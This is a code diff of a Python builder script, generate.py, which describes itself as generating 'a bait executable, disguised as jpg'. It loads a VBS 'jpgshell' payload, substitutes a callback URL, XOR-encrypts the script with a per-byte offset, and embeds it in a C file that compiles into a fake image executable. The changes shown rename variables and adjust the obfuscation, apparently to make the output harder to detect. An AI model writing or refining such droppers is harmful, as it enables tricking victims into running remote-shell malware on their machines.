@@ -5,7 +5,7 @@ import time
 parser = argparse.ArgumentParser(
                     prog='generate.py',
                     description='Generate a bait executable, disguised as jpg',
-                    usage='generate.py -p jpgshell -a CALLBACK_URL=http://localhost:80/ JPG_URL=https://cdn.pixabay.com/photo/2024/02/26/19/39/monochrome-image-8598798_640.jpg JPG_OUTPUT_NAME=a.jpg -o myfilename -s **[]!?')
+                    usage='generate.py -p jpgshell.vbs -a CALLBACK_URL=http://localhost:80/ JPG_URL=https://cdn.pixabay.com/photo/2024/02/26/19/39/monochrome-image-8598798_640.jpg JPG_OUTPUT_NAME=a.jpg -o myfilename -s **[]!?')
 parser.add_argument("-o", "--out", help="Output jpg file name (without extension)")
 parser.add_argument("-p", "--payload", help="Payload to use")
 parser.add_argument("-a", "--arguments", nargs="*", help="Payload arguments")
@@ -30,8 +30,9 @@ def create_payload(p:pathlib.Path, payload: str, arguments: dict, secret: str):
     with open(f"{p}\\..\\payloads\\{payload}", 'r') as f:
         vbs_script = f.read()
         vbs_script = replace_args(vbs_script, arguments)
-        print(vbs_script)
+        
         encrypted_payload = get_encrypted_payload(vbs_script, secret)
+        print(encrypted_payload)
         temp_file_name = get_temp_name()
         create_temp_c_file(p, encrypted_payload, secret, temp_file_name)
     return temp_file_name
@@ -39,7 +40,8 @@ def create_payload(p:pathlib.Path, payload: str, arguments: dict, secret: str):
 def get_encrypted_payload(script: str, secret: str):
     result = "{"
     for i in range(len(script)):
-        result += f"{str(ord(script[i]) ^ ord(secret[i % len(secret)]))},"
+        xored = ord(script[i]) ^ ord(secret[i % len(secret)])
+        result += f"{str(xored+1)},"
     result += "0}"
     return result
 
@@ -48,8 +50,9 @@ def create_temp_c_file(p: pathlib.Path, payload: str, secret: str, temp_file_nam
     with open(f"{p}\\..\\src\\runscript.c",'r') as f:
         c_file_content = f.read()
         splitted = c_file_content.split("//SCRIPT COMES HERE")
-        new_content = f"\nchar script[] = {payload};\nchar secret[] = \"{secret}\";\n".join(splitted)
+        new_content = f"\nchar sc[] = {payload};\nchar s[] = \"{secret}\";\n".join(splitted)
     with open(f"{p}\\..\\build\\{temp_file_name}",'w') as f:
+        print(new_content)
         f.write(new_content)
 
 def replace_args(script: str, arguments: dict):
